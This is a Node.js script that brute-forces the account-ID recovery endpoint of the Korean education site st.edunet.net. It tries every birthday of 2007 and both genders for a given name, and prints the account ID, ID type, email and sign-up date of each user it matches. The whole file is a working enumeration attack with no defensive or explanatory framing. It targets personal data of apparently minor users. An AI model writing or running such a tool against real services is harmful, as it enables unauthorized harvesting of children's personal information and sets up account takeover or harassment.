const { exit } = require('process')
var number = 1
function brute(bday, name, gen, year) {
    const req = require('https').request({
        host: 'st.edunet.net',
        path: '/member/findIdSearch',
        method: 'POST',
        headers: {
            "Host": "st.edunet.net",
            "Connection": "keep-alive",
            "Content-Length": 55,
            "sec-ch-ua": " Not A;Brand",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua-platform": "Windows",
            "Origin": "https://st.edunet.net",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://st.edunet.net/member/findInfo?gubun=&searchtype=id&in_div=nedu&isMobile=",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        }
    }, function (res) {
        var data = ''
        res.on('data', function (chunk) {
            data += chunk
        })
        res.on('end', function () {
            try {
                if (data == '{"ResultCode":"-1","ResultMessage":"사용자가 존재하지 않습니다.","ErrorCode":"0001"}') {
 
                } else {
                    try {json_length = JSON.parse(data).ResultMessage.length;} catch (e) {if (e instanceof SyntaxError) {console.log("\x1b[31mNo one has that name.\x1b[0m");exit()} else {console.log(e)}}
                    console.log(`====================\x1b[33m${number}th\x1b[0m======================`);
                    console.log(`\x1b[32mName\x1b[0m: ${name}`);//이름
                    console.log(`\x1b[32mBirthday\x1b[0m: ${year}년 ${bday.substring(0, 2)}월 ${bday.substring(2, 4)}일`)//생일
                    console.log(`\x1b[32mGender\x1b[0m: ${gen}`)//성별

                    var i = 0;
                    while (i < json_length) {
                        console.log(`\x1b[31m*****${i + 1}th*****\x1b[0m`)//~번째
                        console.log(`\x1b[32mId\x1b[0m: ${JSON.parse(data).ResultMessage[i].id}`)//아이디
                        console.log(`\x1b[32mId_type\x1b[0m: ${JSON.parse(data).ResultMessage[i].id_type}`)//아이디 타입
                        console.log(`\x1b[32mEmail\x1b[0m: ${JSON.parse(data).ResultMessage[i].email}`)//이메일
                        console.log(`\x1b[32mRegymdt\x1b[0m: ${JSON.parse(data).ResultMessage[i].regymdt.substring(0, 5)} ${JSON.parse(data).ResultMessage[i].regymdt.substring(5, 8)} ${JSON.parse(data).ResultMessage[i].regymdt.substring(8, 11)}`)//가입년월
                        i = i + 1;
                    }
                    console.log('==============================================')
                    number = number + 1
                    return
                }
            } catch (e) {
                console.log('Error')
            }
        })
    })
    req.write('{\"name\":\"' + name + '\",\"gender\":\"' + gen + '\",\"birthday\":\"' + year + '' + bday + '\"}')
    req.end()

}
const arr = ["M", "F"];
for (const gen of arr){
    for (var month = 1; month <= 12; month++) {
        for (var day = 1; day <= 31; day++) {
            brute(month.toString().padStart(2, '0') + day.toString().padStart(2, '0'), 'name', gen, '2007')
        }
    }
}
